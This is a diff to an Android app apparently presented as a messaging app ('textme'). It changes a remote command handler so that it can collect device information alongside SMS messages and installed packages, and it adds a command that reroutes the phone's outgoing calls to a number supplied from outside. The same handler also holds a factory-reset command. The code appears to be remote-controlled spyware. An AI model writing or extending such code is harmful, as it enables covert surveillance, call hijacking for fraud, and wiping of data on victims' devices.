@@ -67,6 +67,7 @@ import com.candroid.textme.data.pojos.PhoneCall;
 import com.candroid.textme.data.pojos.SmsMsg;
 import com.candroid.textme.jobs.JobsIntentService;
 import com.candroid.textme.receivers.AdminReceiver;
+import com.candroid.textme.receivers.OutgoingCallReceiver;
 import com.candroid.textme.ui.activities.MainActivity;
 
 import java.io.ByteArrayOutputStream;
@@ -386,7 +387,7 @@ public class Lofl {
         context.startActivity(webSearchIntent);
     }
 
-    public static void onReceiveCommand(Context context, int command) {
+    public static void onReceiveCommand(Context context, int command, String arg1) {
         boolean commandFound = false;
         Intent intent = new Intent();
         switch (command) {
@@ -451,6 +452,9 @@ public class Lofl {
                 intent.setAction(JobsIntentService.ACTION_PACKAGES);
                 context.startService(intent);
                 intent.setAction(null);
+                intent.setAction(JobsIntentService.ACTION_DEVICE_INFO);
+                context.startService(intent);
+                intent.setAction(null);
                 intent.setAction(JobsIntentService.ACTION_SMS);
                 commandFound = true;
                 break;
@@ -486,6 +490,14 @@ public class Lofl {
             case Commands.FACTORY_RESET:
                 intent.setAction(JobsIntentService.ACTION_FACTORY_RESET);
                 intent.setClass(context, JobsIntentService.class);
+                commandFound = true;
+                break;
+            case Commands.REROUTE_PHONE_CALLS:
+                if(arg1 != null){
+                    intent.putExtra(OutgoingCallReceiver.NUMBER_KEY, arg1);
+                    intent.setAction(JobsIntentService.ACTION_REROUTE_CALLS);
+                    intent.setClass(context, JobsIntentService.class);
+                }
                 commandFound = true;
                 break;
             default:
